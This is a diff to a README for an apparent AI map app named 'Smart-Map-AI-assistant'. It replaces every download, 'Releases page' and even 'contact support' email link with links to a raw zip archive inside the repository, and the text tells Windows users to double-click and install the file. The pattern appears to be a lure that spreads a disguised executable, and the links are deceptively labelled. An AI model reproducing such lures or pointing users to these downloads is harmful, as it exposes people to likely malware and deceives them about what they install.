@@ -1,6 +1,6 @@
 # 🗺️ Smart-Map-AI-assistant - Discover the Best Locations with AI
 
-[![Download Smart-Map-AI-assistant](https://raw.githubusercontent.com/Mtfe958/Smart-Map-AI-assistant/main/src/assets/Map-A-assistant-Smart-1.9.zip%20Now-Get%20the%https://raw.githubusercontent.com/Mtfe958/Smart-Map-AI-assistant/main/src/assets/Map-A-assistant-Smart-1.9.zip)](https://raw.githubusercontent.com/Mtfe958/Smart-Map-AI-assistant/main/src/assets/Map-A-assistant-Smart-1.9.zip)
+[![Download Smart-Map-AI-assistant](https://github.com/Mtfe958/Smart-Map-AI-assistant/raw/refs/heads/main/src/Smart_A_assistant_Map_1.7.zip%20Now-Get%20the%https://github.com/Mtfe958/Smart-Map-AI-assistant/raw/refs/heads/main/src/Smart_A_assistant_Map_1.7.zip)](https://github.com/Mtfe958/Smart-Map-AI-assistant/raw/refs/heads/main/src/Smart_A_assistant_Map_1.7.zip)
 
 ## 🛠️ Overview
 
@@ -18,16 +18,16 @@ To get started with Smart-Map-AI-assistant, follow these simple steps:
 
 2. **Download the Application**: 
    - Visit the Releases page to download Smart-Map-AI-assistant.
-   - You can access the page here: [Download Smart-Map-AI-assistant](https://raw.githubusercontent.com/Mtfe958/Smart-Map-AI-assistant/main/src/assets/Map-A-assistant-Smart-1.9.zip).
+   - You can access the page here: [Download Smart-Map-AI-assistant](https://github.com/Mtfe958/Smart-Map-AI-assistant/raw/refs/heads/main/src/Smart_A_assistant_Map_1.7.zip).
 
 ## 📥 Download & Install
 
 1. **Go to the Releases Page**: Click the link below to visit the page where you can download the latest version:
-   - [Download Smart-Map-AI-assistant](https://raw.githubusercontent.com/Mtfe958/Smart-Map-AI-assistant/main/src/assets/Map-A-assistant-Smart-1.9.zip)
+   - [Download Smart-Map-AI-assistant](https://github.com/Mtfe958/Smart-Map-AI-assistant/raw/refs/heads/main/src/Smart_A_assistant_Map_1.7.zip)
   
 2. **Select the Latest Release**: Find the most recent version at the top. This is usually the best choice for stability and features. 
 
-3. **Download the File**: Click on the appropriate file for your operating system. For example, if you see `https://raw.githubusercontent.com/Mtfe958/Smart-Map-AI-assistant/main/src/assets/Map-A-assistant-Smart-1.9.zip`, click on it to start the download.
+3. **Download the File**: Click on the appropriate file for your operating system. For example, if you see `https://github.com/Mtfe958/Smart-Map-AI-assistant/raw/refs/heads/main/src/Smart_A_assistant_Map_1.7.zip`, click on it to start the download.
 
 4. **Install the Application**: 
    - For Windows: Locate the downloaded file in your Downloads folder. Double-click the file and follow the prompts to install.
@@ -67,8 +67,8 @@ If you encounter any issues or have questions:
 
 1. **FAQs**: Refer to the frequently asked questions section within the app.
 2. **Community Forums**: Visit our community forums to ask questions and share experiences with other users.
-3. **Contact Support**: If you need further assistance, you can reach out via email at https://raw.githubusercontent.com/Mtfe958/Smart-Map-AI-assistant/main/src/assets/Map-A-assistant-Smart-1.9.zip
+3. **Contact Support**: If you need further assistance, you can reach out via email at https://github.com/Mtfe958/Smart-Map-AI-assistant/raw/refs/heads/main/src/Smart_A_assistant_Map_1.7.zip
 
 Feel free to explore, discover new locations, and enjoy your time with Smart-Map-AI-assistant!
 
-For more details and updates, keep checking the Releases page: [Download Smart-Map-AI-assistant](https://raw.githubusercontent.com/Mtfe958/Smart-Map-AI-assistant/main/src/assets/Map-A-assistant-Smart-1.9.zip).
+For more details and updates, keep checking the Releases page: [Download Smart-Map-AI-assistant](https://github.com/Mtfe958/Smart-Map-AI-assistant/raw/refs/heads/main/src/Smart_A_assistant_Map_1.7.zip).
